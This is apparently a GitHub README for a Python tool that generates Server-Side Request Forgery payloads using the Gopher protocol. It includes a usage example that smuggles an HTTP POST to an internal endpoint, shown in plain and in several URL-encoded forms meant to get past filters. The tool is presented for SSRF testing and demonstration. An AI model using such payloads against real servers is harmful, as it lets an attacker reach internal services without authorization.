# SSRF Gopher Payloads

This project contains a collection of Server-Side Request Forgery (SSRF) payloads using the Gopher protocol. These payloads can be used for testing and demonstrating SSRF vulnerabilities.

This project is implemented in pure Python with no external libraries required.

## Usage

1. Clone the repository:
    ```sh
    git clone https://github.com/dekadentno/ssrf-gopher-payloads.git
    ```
2. Navigate to the project directory:
    ```sh
    cd ssrf-gopher-payloads
    ```
3. Use the payloads in your SSRF testing.
    ```sh
    python ssrf-gopher-payloads.py --host localhost --port 80 --endpoint /api/v1/product --data "price=50&quantity=2" --request-type POST

    🚀 Plain Text Payload:
    gopher://localhost:80/_POST /api/v1/product HTTP/1.1
    Host: localhost
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 19

    price=50&quantity=2

    🔗 URL Encoded Payload:
    gopher://localhost:80/_POST%20/api/v1/product%20HTTP/1.1%0AHost%3A%20localhost%0AContent-Type%3A%20application/x-www-form-urlencoded%0AContent-Length%3A%2019%0A%0Aprice%3D50%26quantity%3D2

    🔐 Double URL Encoded Payload:
    gopher://localhost:80/_POST%2520/api/v1/product%2520HTTP/1.1%250AHost%253A%2520localhost%250AContent-Type%253A%2520application/x-www-form-urlencoded%250AContent-Length%253A%252019%250A%250Aprice%253D50%2526quantity%253D2

    🌐 Fully URL Encoded Payload:
    gopher%3A//localhost%3A80/_POST%252520/api/v1/product%252520HTTP/1.1%25250AHost%25253A%252520localhost%25250AContent-Type%25253A%252520application/x-www-form-urlencoded%25250AContent-Length%25253A%25252019%25250A%25250Aprice%25253D50%252526quantity%25253D2
    ```

## Contributing

Contributions are welcome! Please submit a pull request or open an issue to discuss your ideas.

## License

See the [LICENSE](LICENSE) file for details.